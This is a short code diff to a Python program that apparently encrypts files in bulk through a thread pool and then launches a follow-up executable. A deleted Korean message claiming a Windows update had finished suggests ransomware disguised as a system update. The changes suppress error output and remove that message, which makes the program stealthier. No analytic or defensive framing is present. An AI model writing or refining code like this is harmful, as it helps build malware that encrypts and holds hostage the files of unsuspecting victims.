@@ -89,7 +89,7 @@ class Encryptor:
                         self.encEach(file)
                 
         except Exception as e:
-            print(f"[DEBUG] Error on Encrypt.encryptFile(): {e}")
+            pass
 
 def setEncryptModule():
     global EncryptModule
@@ -151,7 +151,6 @@ def doEnc():
     while (len(ThreadPool)!=0):
         th=ThreadPool.pop()
         th.join()
-    print("Windows 업데이트가 완료되었습니다.")
     dumpVariable()
     os.system(afterFileName)
     sys.exit()
